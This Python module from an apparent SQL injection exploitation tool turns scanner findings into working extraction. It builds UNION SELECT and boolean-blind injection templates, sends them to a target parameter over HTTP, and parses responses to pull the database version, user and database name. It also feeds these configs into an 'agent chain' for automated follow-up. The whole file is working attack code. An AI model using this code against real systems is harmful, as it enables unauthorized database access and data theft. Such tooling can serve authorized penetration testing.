#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Bridge scan results → union/blind extraction (sqli_shell + agent chain)."""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Dict, Optional

from .comparison import boolean_evidence, similarity
from .extractor import extract_scalar_blind, make_blind_oracle
from .injection_context import InjectionContext
from .oracle import HttpParameterOracle, ProbeResponse


@dataclass
class ExtractionConfig:
    technique: str = "union"
    union_template: str = ""
    blind_true_template: str = ""
    marker: str = "KSPI"
    original: str = "1"
    column_count: int = 2
    dbms: Optional[str] = None
    injection_context: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "technique": self.technique,
            "union_template": self.union_template,
            "blind_true_template": self.blind_true_template,
            "marker": self.marker,
            "original": self.original,
            "column_count": self.column_count,
            "dbms": self.dbms,
            "injection_context": dict(self.injection_context),
        }


@dataclass
class ExtractionPreview:
    config: ExtractionConfig
    version: str = ""
    user: str = ""
    database: str = ""
    request_count: int = 0
    error: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "config": self.config.to_dict(),
            "version": self.version,
            "user": self.user,
            "database": self.database,
            "request_count": self.request_count,
            "error": self.error,
        }


def context_from_scan(scan: Any) -> InjectionContext:
    raw = dict(getattr(scan, "injection_context", None) or {})
    original = str(raw.get("original") or getattr(scan, "original_value", None) or "1")
    return InjectionContext(
        original=original,
        numeric=bool(raw.get("numeric")),
        quote=str(raw.get("quote") or "'"),
        paren_close=str(raw.get("paren_close") or ""),
        comment=str(raw.get("comment") or "-- "),
    )


def build_union_template(ctx: InjectionContext, columns: int = 2) -> str:
    cols = max(2, int(columns or 2))
    parts = ["'{marker}'", "{expr}"] + (["NULL"] * (cols - 2) if cols > 2 else [])
    select_list = ",".join(parts)
    lead = f"{ctx.original}{ctx.close_quote()}{ctx.paren_close}"
    suffix = ctx.comment.strip() or "#"
    if not suffix.startswith(("#", "--")):
        suffix = "#"
    return f"{lead} UNION SELECT {select_list}{suffix}"


def build_blind_true_template(ctx: InjectionContext) -> str:
    if ctx.numeric:
        return "{original} AND ({cond})"
    q = ctx.quote or "'"
    suffix = ctx.comment.strip() or "-- "
    return f"{{original}}{q}{ctx.paren_close} AND ({{cond}}){suffix}"


def recommend_technique(scan: Any) -> str:
    technique = str(getattr(scan, "technique", "") or "").lower()
    if technique == "union" or getattr(scan, "column_count", None):
        return "union"
    if technique.startswith("boolean") or technique == "time":
        return "blind_boolean"
    if technique == "error":
        return "union"
    return "blind_boolean"


def build_extraction_config(scan: Any) -> ExtractionConfig:
    ctx = context_from_scan(scan)
    columns = int(getattr(scan, "column_count", None) or 2)
    technique = recommend_technique(scan)
    return ExtractionConfig(
        technique=technique,
        union_template=build_union_template(ctx, columns),
        blind_true_template=build_blind_true_template(ctx),
        original=ctx.original,
        column_count=columns,
        dbms=getattr(scan, "dbms", None),
        injection_context=ctx.to_dict(),
    )


def parse_union_scalar(body: str, marker: str = "KSPI") -> str:
    text = str(body or "")
    if not text:
        return ""
    if marker and marker in text:
        idx = text.index(marker)
        tail = text[idx + len(marker):]
        for sep in ("</", "\n", "\r", ",", "|", " ", "'", '"'):
            if sep in tail[:256]:
                return tail.split(sep, 1)[0].strip()[:512]
        return tail.strip()[:512]
    m = re.search(r"[\d]+\.[\d]+\.[\d]+[^\s<\"']{0,40}", text)
    return m.group(0).strip() if m else ""


def _wrap_expr(expr: str) -> str:
    raw = str(expr or "").strip().rstrip(";")
    if raw.upper().startswith("SELECT"):
        return f"({raw})"
    return f"(SELECT {raw})"


def _union_payload(config: ExtractionConfig, expr: str) -> str:
    tpl = config.union_template
    if "{expr}" not in tpl:
        raise ValueError("union_template must contain {expr}")
    return tpl.replace("{marker}", config.marker).replace("{expr}", _wrap_expr(expr))


def _make_blind_oracle_from_context(
    oracle: HttpParameterOracle,
    ctx: InjectionContext,
    baseline: ProbeResponse,
) -> Any:
    requests = {"n": 0}

    def true(cond: str) -> bool:
        true_payload = ctx.append_sql(f" AND ({cond}){ctx.comment}".rstrip())
        false_payload = ctx.append_sql(f" AND (1=2){ctx.comment}".rstrip())
        true_resp = oracle.send(true_payload)
        false_resp = oracle.send(false_payload)
        requests["n"] += 2
        if boolean_evidence(baseline, true_resp, false_resp):
            return True
        return similarity(baseline.text, true_resp.text) >= 0.90 and similarity(
            true_resp.text, false_resp.text
        ) <= 0.85

    def gt(expr: str) -> bool:
        return true(f"({expr})")

    return make_blind_oracle(true, gt_fn=gt), requests


def extract_scalar_union(
    oracle: HttpParameterOracle,
    config: ExtractionConfig,
    expr: str,
) -> str:
    payload = _union_payload(config, expr)
    resp = oracle.send(payload)
    body = resp.text if hasattr(resp, "text") else str(resp)
    return parse_union_scalar(body, config.marker)


def extract_version_preview(
    oracle: HttpParameterOracle,
    scan: Any,
    *,
    max_blind_length: int = 64,
    blind_threads: int = 6,
) -> ExtractionPreview:
    """Best-effort @@version / user() / database() using scan context."""
    config = build_extraction_config(scan)
    baseline = oracle.baseline()
    start_count = oracle.request_count
    preview = ExtractionPreview(config=config)

    try:
        if config.technique == "union":
            preview.version = extract_scalar_union(oracle, config, "@@version") or extract_scalar_union(
                oracle, config, "version()"
            )
            if preview.version:
                preview.user = extract_scalar_union(oracle, config, "user()")
                preview.database = extract_scalar_union(oracle, config, "database()")
        if not preview.version:
            config.technique = "blind_boolean"
            ctx = context_from_scan(scan)
            blind_oracle, counter = _make_blind_oracle_from_context(oracle, ctx, baseline)
            preview.version = (
                extract_scalar_blind(
                    blind_oracle,
                    "SELECT @@version",
                    threads=blind_threads,
                    max_length=max_blind_length,
                )
                or ""
            )
            if preview.version:
                preview.user = extract_scalar_blind(
                    blind_oracle, "SELECT user()", threads=blind_threads, max_length=48
                ) or ""
    except Exception as exc:
        preview.error = str(exc)[:200]

    preview.request_count = max(0, oracle.request_count - start_count)
    return preview


def enrich_scan_hit(hit: Dict[str, Any], scan: Any, preview: Optional[ExtractionPreview] = None) -> None:
    """Attach extraction config / preview to scanner hit dict for agent chain."""
    config = build_extraction_config(scan)
    hit["extraction_config"] = config.to_dict()
    hit["recommended_technique"] = config.technique
    hit["union_template"] = config.union_template
    hit["blind_true_template"] = config.blind_true_template
    hit["inj_original"] = config.original
    if preview:
        hit["extraction_preview"] = preview.to_dict()
        if preview.version:
            hit["extracted_version"] = preview.version
        if preview.user:
            hit["extracted_user"] = preview.user
        if preview.database:
            hit["extracted_database"] = preview.database


def config_from_hit_dict(hit: Dict[str, Any]) -> Optional[ExtractionConfig]:
    block = hit.get("extraction_config")
    if not isinstance(block, dict):
        return None
    return ExtractionConfig(
        technique=str(block.get("technique") or "union"),
        union_template=str(block.get("union_template") or ""),
        blind_true_template=str(block.get("blind_true_template") or ""),
        marker=str(block.get("marker") or "KSPI"),
        original=str(block.get("original") or hit.get("inj_original") or "1"),
        column_count=int(block.get("column_count") or 2),
        dbms=block.get("dbms"),
        injection_context=dict(block.get("injection_context") or {}),
    )
